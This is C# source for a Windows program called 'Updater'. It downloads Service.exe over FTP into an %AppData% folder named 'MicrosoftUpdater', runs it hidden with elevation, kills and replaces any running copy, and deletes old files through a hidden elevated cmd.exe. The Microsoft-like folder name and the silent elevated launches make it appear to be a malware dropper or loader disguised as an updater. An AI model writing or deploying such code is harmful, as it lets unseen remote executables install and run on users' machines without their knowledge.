using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Updater
{
    static class Program
    {
        public static List<string> files = new List<string>();
        public static List<Process> procs = new List<Process>();
        [STAThread]
        static void Main(string[] args)
        {

            bool isWorking = args.Length > 0 ? CheckService(args[0]) : CheckService("Service");

            if (isWorking)
            {
                try
                {
                    string directoryName = Path.GetDirectoryName(files[0]) + "\\";
                    string fileName = Path.GetFileName(files[0]);


                    FTP.DownloadF("Service.exe", directoryName, "ServiceNew.exe");
                    procs[0].Kill();

                    File.Move(files[0], directoryName + "ServiceOld.exe");
                    File.Move(directoryName + "ServiceNew.exe", directoryName + fileName);
                    try
                    {
                        Process p = new Process
                        {
                            StartInfo = new ProcessStartInfo()
                            {
                                FileName = "cmd.exe",
                                Verb = "runas",
                                Arguments = string.Format("/c del \"{0}\"", directoryName + "ServiceOld.exe"),
                                WindowStyle = ProcessWindowStyle.Hidden
                            }
                        };
                        p.Start();
                        Thread.Sleep(5000);
                        p.Kill();
                    }
                    catch (Exception ex)
                    {
                        Log.Send("File delete Ex: " + ex.Message);
                    }
                    new Process
                    {
                        StartInfo =
                    {
                        FileName = directoryName + fileName,
                        Verb = "runas",
                        WindowStyle = ProcessWindowStyle.Hidden
                    }
                    }.Start();
                }
                catch(Exception ex)
                {
                    Log.Send("isWorking = " + isWorking + " Ex: " + ex.Message);
                }

            }
            else
            {
                try
                { 
                    string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\MicrosoftUpdater\\";

                    if (!Directory.Exists(folderPath))
                    {
                        DirectoryInfo directoryInfo = Directory.CreateDirectory(folderPath);
                    }

                    if (!File.Exists(folderPath + "Service.exe"))
                    {
                        FTP.DownloadF("Service.exe", folderPath, "Service.exe");
                    }
                    else
                    {
                        FTP.DownloadF("Service.exe", folderPath, "ServiceNew.exe");

                        File.Move(folderPath + "Service.exe", folderPath + "ServiceOld.exe");
                        File.Move(folderPath + "ServiceNew.exe", folderPath + "Service.exe");
                        File.Delete(folderPath + "ServiceOld.exe");
                    }

                    new Process
                    {
                        StartInfo =
                        {
                            FileName = folderPath + "Service.exe",
                            Verb = "runas",
                            WindowStyle = ProcessWindowStyle.Hidden
                        }
                    }.Start();
                }
                catch (Exception ex)
                {
                    Log.Send("isWorking = " + isWorking + " Ex: " + ex.Message);
                }

            }


        }

        private static void AddFileSecurity(string fileName, string v, object readData, object allow)
        {
            throw new NotImplementedException();
        }

        private static bool CheckService(string description)
        {
            bool result = false;

            int num = 0;
            foreach (Process process in Process.GetProcesses())
            {
                try
                {
                    if (process.MainModule.FileVersionInfo.FileDescription == description)
                    {
                        files.Add(process.MainModule.FileName);
                        procs.Add(process);
                        num++;
                    }
                }
                catch (Exception ex)
                {
                    Log.Send(ex.Message);
                }
            }

            if (num > 0)
            {
                result = true;
            }
            return result;
        }
    }
}
